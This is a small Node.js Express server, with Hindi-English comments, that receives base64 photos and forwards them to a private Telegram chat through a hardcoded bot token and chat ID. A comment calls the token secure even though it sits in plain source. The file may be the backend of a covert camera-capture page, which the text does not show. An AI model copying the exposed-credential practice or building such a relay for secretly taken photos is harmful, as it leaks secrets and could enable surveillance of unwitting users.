// server.js - Backend Code (Vercel par deploy karein)
const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const app = express();

// ✅ Token BACKEND mein secure hai
const TELEGRAM_BOT_TOKEN = "8312788837:AAGD5Sv0G0_ja2YQLixHQJ865vvi54rFI8w";
const TELEGRAM_CHAT_ID = "7528977004";

app.use(express.json({ limit: '50mb' }));

// Photo send endpoint
app.post('/send-photo', async (req, res) => {
    try {
        const { photoData } = req.body;
        
        // Convert base64 to buffer
        const base64Data = photoData.replace(/^data:image\/jpeg;base64,/, '');
        const buffer = Buffer.from(base64Data, 'base64');
        
        // Send to Telegram
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CHAT_ID);
        formData.append('photo', buffer, {
            filename: 'photo.jpg',
            contentType: 'image/jpeg'
        });
        
        const response = await axios.post(
            `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`,
            formData,
            { headers: formData.getHeaders() }
        );
        
        res.json({ success: true });
        
    } catch (error) {
        res.json({ success: false });
    }
});

module.exports = app;
